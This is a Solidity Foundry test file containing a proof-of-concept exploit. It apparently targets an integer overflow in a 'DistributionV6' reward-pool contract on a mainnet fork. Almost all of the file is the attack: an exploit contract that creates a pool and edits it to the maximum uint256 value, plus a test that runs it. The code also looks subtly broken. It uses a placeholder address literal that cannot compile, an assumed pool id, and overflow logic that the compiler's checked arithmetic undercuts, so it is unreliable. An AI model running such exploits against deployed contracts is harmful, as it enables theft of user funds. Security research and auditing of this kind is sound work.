// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";

interface IDistributionV6 {
    function createPool(uint256 rewardAmount, uint256 totalSupply) external;
    function editPool(uint256 poolId, uint256 newRewardAmount) external;
    function getPeriodReward(uint256 poolId) external view returns (uint256);
}

contract OverflowExploit {
    IDistributionV6 public target;
    uint256 public attackPoolId;

    constructor(address _target) {
        target = IDistributionV6(_target);
    }

    function executeAttack(uint256 rewardAmount, uint256 totalSupply) external {
        // Create a pool with a large reward amount to trigger overflow
        target.createPool(rewardAmount, totalSupply);
        attackPoolId = 0; // Assuming the first pool is created
        // Edit the pool to cause overflow
        target.editPool(attackPoolId, type(uint256).max);
    }

    function getExploitReward() external view returns (uint256) {
        return target.getPeriodReward(attackPoolId);
    }
}

contract DistributionV6Test is Test {
    IDistributionV6 target;
    OverflowExploit exploit;

    function setUp() public {
        vm.createSelectFork("https://eth.llamarpc.com");
        target = IDistributionV6(0xActualDistributionV6Address);
        exploit = new OverflowExploit(address(target));
    }

    function testOverflowAttack() public {
        uint256 largeRewardAmount = 2**256 - 1; // Max uint256
        uint256 totalSupply = 1000;

        exploit.executeAttack(largeRewardAmount, totalSupply);
        uint256 reward = exploit.getExploitReward();

        // Assert that the reward is not what it should be due to overflow
        assertTrue(reward < largeRewardAmount, "Reward should be less than the large reward amount due to overflow");
    }
}